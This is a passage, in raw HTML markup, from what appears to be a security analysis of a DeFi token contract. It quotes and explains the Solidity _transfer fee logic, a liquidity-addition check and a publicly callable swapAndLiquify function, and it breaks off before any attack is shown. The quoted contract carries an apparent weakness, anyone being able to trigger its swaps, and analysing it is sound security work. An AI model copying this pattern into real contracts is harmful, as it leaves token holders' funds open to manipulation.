</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>override<span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>from<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>_isExcludedFromVip<span class="p">[</span>from<span class="p">],</span><span class="w"> </span><span class="s2">&quot;ERC20: transfer from the zero address&quot;</span><span class="p">);</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>to<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC20: transfer to the zero address&quot;</span><span class="p">);</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>amount<span class="o">&gt;</span><span class="m m-Decimal">0</span><span class="p">);</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>_isExcludedFromVipFees<span class="p">[</span>from<span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>_isExcludedFromVipFees<span class="p">[</span>to<span class="p">]){</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">        </span>super<span class="p">.</span>_transfer<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>to<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">        </span><span class="kt">return</span><span class="p">;</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nv">isAddLdx</span><span class="p">;</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>to<span class="w"> </span><span class="o">==</span><span class="w"> </span>uniswapV2Pair<span class="p">){</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="w">        </span>isAddLdx<span class="w"> </span><span class="o">=</span><span class="w"> </span>_isAddLiquidityV1<span class="p">();</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>swapTokensAtAmount<span class="p">){</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="w">            </span><span class="o">!</span>swapping<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="w">            </span>_tokenOwner<span class="w"> </span><span class="o">!=</span><span class="w"> </span>from<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="w">            </span>_tokenOwner<span class="w"> </span><span class="o">!=</span><span class="w"> </span>to<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="w">            </span>from<span class="w"> </span><span class="o">!=</span><span class="w"> </span>uniswapV2Pair<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="w">            </span>swapAndLiquifyEnabled<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="w">            </span><span class="o">!</span>isAddLdx
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="w">        </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="w">            </span>swapping<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="w">            </span>swapAndLiquify<span class="p">();</span>
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="w">            </span>swapping<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>
</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nv">takeFee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span>swapping<span class="p">;</span>
</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_isExcludedFromFees<span class="p">[</span>from<span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>_isExcludedFromFees<span class="p">[</span>to<span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>_destroyMax<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>balanceOf<span class="p">(</span>_destroyAddress<span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="w">        </span>takeFee<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a><span class="w">    </span><span class="p">}</span><span class="kt">else</span><span class="p">{</span>
</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a><span class="w">        </span><span class="kt">if</span><span class="p">(</span>from<span class="w"> </span><span class="o">==</span><span class="w"> </span>uniswapV2Pair<span class="p">){</span>
</span><span id="__span-3-40"><a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a><span class="w">            </span><span class="kt">require</span><span class="p">(</span>swapBuyStats<span class="p">);</span>
</span><span id="__span-3-41"><a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a><span class="w">        </span><span class="p">}</span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="p">(</span>to<span class="w"> </span><span class="o">==</span><span class="w"> </span>uniswapV2Pair<span class="p">){</span>
</span><span id="__span-3-42"><a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a><span class="w">            </span><span class="kt">require</span><span class="p">(</span>swapSellStats<span class="p">);</span>
</span><span id="__span-3-43"><a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a><span class="w">            </span><span class="kt">if</span><span class="p">(</span>balanceOf<span class="p">(</span>from<span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>amount<span class="p">){</span>
</span><span id="__span-3-44"><a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a><span class="w">                </span>amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">10000</span><span class="p">).</span>mul<span class="p">(</span><span class="m m-Decimal">9999</span><span class="p">);</span>
</span><span id="__span-3-45"><a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-3-46"><a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a><span class="w">        </span><span class="p">}</span><span class="kt">else</span><span class="p">{</span>
</span><span id="__span-3-47"><a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a><span class="w">            </span>takeFee<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
</span><span id="__span-3-48"><a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-3-49"><a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-50"><a id="__codelineno-3-50" name="__codelineno-3-50" href="#__codelineno-3-50"></a>
</span><span id="__span-3-51"><a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>takeFee<span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-52"><a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a><span class="w">        </span>super<span class="p">.</span>_transfer<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>_destroyAddress<span class="p">,</span><span class="w"> </span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">).</span>mul<span class="p">(</span>deadRate<span class="p">));</span>
</span><span id="__span-3-53"><a id="__codelineno-3-53" name="__codelineno-3-53" href="#__codelineno-3-53"></a><span class="w">        </span>super<span class="p">.</span>_transfer<span class="p">(</span>from<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">).</span>mul<span class="p">(</span>ldxRate<span class="p">));</span>
</span><span id="__span-3-54"><a id="__codelineno-3-54" name="__codelineno-3-54" href="#__codelineno-3-54"></a><span class="w">        </span>super<span class="p">.</span>_transfer<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>_fundAddress<span class="p">,</span><span class="w"> </span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">).</span>mul<span class="p">(</span>fundRate<span class="p">));</span>
</span><span id="__span-3-55"><a id="__codelineno-3-55" name="__codelineno-3-55" href="#__codelineno-3-55"></a><span class="w">        </span>amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>amount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">).</span>mul<span class="p">(</span><span class="m m-Decimal">100</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>fundRate<span class="w"> </span><span class="o">-</span><span class="w"> </span>deadRate<span class="w"> </span><span class="o">-</span><span class="w"> </span>ldxRate<span class="p">);</span>
</span><span id="__span-3-56"><a id="__codelineno-3-56" name="__codelineno-3-56" href="#__codelineno-3-56"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-57"><a id="__codelineno-3-57" name="__codelineno-3-57" href="#__codelineno-3-57"></a><span class="w">    </span>super<span class="p">.</span>_transfer<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>to<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-58"><a id="__codelineno-3-58" name="__codelineno-3-58" href="#__codelineno-3-58"></a><span class="p">}</span>
</span></code></pre></div>
<p>This code contains fee calculations. Notably, fees are transferred to the token contract, which is why the token contract holds a balance of the token.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kt">bool</span><span class="w"> </span><span class="nv">isAddLdx</span><span class="p">;</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kt">if</span><span class="p">(</span>to<span class="w"> </span><span class="o">==</span><span class="w"> </span>uniswapV2Pair<span class="p">){</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span>isAddLdx<span class="w"> </span><span class="o">=</span><span class="w"> </span>_isAddLiquidityV1<span class="p">();</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">}</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="kt">if</span><span class="p">(</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>swapTokensAtAmount<span class="p">){</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">        </span><span class="o">!</span>swapping<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">        </span>_tokenOwner<span class="w"> </span><span class="o">!=</span><span class="w"> </span>from<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">        </span>_tokenOwner<span class="w"> </span><span class="o">!=</span><span class="w"> </span>to<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">        </span>from<span class="w"> </span><span class="o">!=</span><span class="w"> </span>uniswapV2Pair<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">        </span>swapAndLiquifyEnabled<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">        </span><span class="o">!</span>isAddLdx
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">        </span>swapping<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w">        </span>swapAndLiquify<span class="p">();</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w">        </span>swapping<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="p">}</span>
</span></code></pre></div>
<p>From a logical perspective, the above part of the code first checks whether it is the target token transfer to the pool. If it is, the <code>_isAddLiquidityV1</code> function is called.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_isAddLiquidityV1</span><span class="p">()</span><span class="kt">internal</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">ldxAdd</span><span class="p">){</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">token0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IUniswapV2Pair<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">)).</span>token0<span class="p">();</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IUniswapV2Pair<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">)).</span>token1<span class="p">();</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">r0</span><span class="p">,</span><span class="kt">uint</span><span class="w"> </span><span class="nv">r1</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IUniswapV2Pair<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">)).</span>getReserves<span class="p">();</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">bal1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IERC20<span class="p">(</span>token1<span class="p">).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">));</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">bal0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IERC20<span class="p">(</span>token0<span class="p">).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">));</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span><span class="w"> </span>token0<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)</span><span class="w"> </span><span class="p">){</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="w"> </span>bal1<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>r1<span class="p">){</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">            </span><span class="kt">uint</span><span class="w"> </span><span class="nv">change1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bal1<span class="w"> </span><span class="o">-</span><span class="w"> </span>r1<span class="p">;</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">            </span>ldxAdd<span class="w"> </span><span class="o">=</span><span class="w"> </span>change1<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">1000</span><span class="p">;</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span><span class="p">}</span><span class="kt">else</span><span class="p">{</span>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="w"> </span>bal0<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>r0<span class="p">){</span>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">            </span><span class="kt">uint</span><span class="w"> </span><span class="nv">change0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bal0<span class="w"> </span><span class="o">-</span><span class="w"> </span>r0<span class="p">;</span>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">            </span>ldxAdd<span class="w"> </span><span class="o">=</span><span class="w"> </span>change0<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">1000</span><span class="p">;</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="p">}</span>
</span></code></pre></div>
<p>This function checks the <code>balance</code> and <code>reserve</code> of the current pool. If the quantity of the other token in the pool (in this case, USDT) increases and exceeds 1,000, it returns <code>true</code>.</p>
<p>Since the validation <code>to == uniswapV2Pair</code> earlier, it indicates that tokens are being added to the pool. Therefore, here, it checks whether the quantity of the other token in the pool has increased to determine if it's a liquidity addition operation.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kt">if</span><span class="p">(</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>swapTokensAtAmount<span class="p">){</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">        </span><span class="o">!</span>swapping<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">        </span>_tokenOwner<span class="w"> </span><span class="o">!=</span><span class="w"> </span>from<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">        </span>_tokenOwner<span class="w"> </span><span class="o">!=</span><span class="w"> </span>to<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">        </span>from<span class="w"> </span><span class="o">!=</span><span class="w"> </span>uniswapV2Pair<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">        </span>swapAndLiquifyEnabled<span class="w"> </span><span class="o">&amp;&amp;</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">        </span><span class="o">!</span>isAddLdx
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">        </span>swapping<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">        </span>swapAndLiquify<span class="p">();</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">        </span>swapping<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="p">}</span>
</span></code></pre></div>
<p>Afterward, the contract will check if the balance is greater than a threshold value. If it is, and it is not a liquidity addition scenario (along with some other checks), the <code>swapAndLiquify</code> function will be invoked.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">swapAndLiquify</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">allAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>allAmount<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">18</span><span class="p">){</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">canswap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>allAmount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">);</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">otherAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>allAmount<span class="p">.</span>sub<span class="p">(</span>canswap<span class="p">);</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">        </span>swapTokensForOther<span class="p">(</span>canswap<span class="p">);</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">ethBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ETH<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">        </span>addLiquidityUsdt<span class="p">(</span>ethBalance<span class="p">,</span><span class="w"> </span>otherAmount<span class="p">);</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="p">}</span>
</span></code></pre></div>
<p>This function checks the contract balance and uses half of the token balance as parameter to call <code>swapTokensForOther</code>.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">swapTokensForOther</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
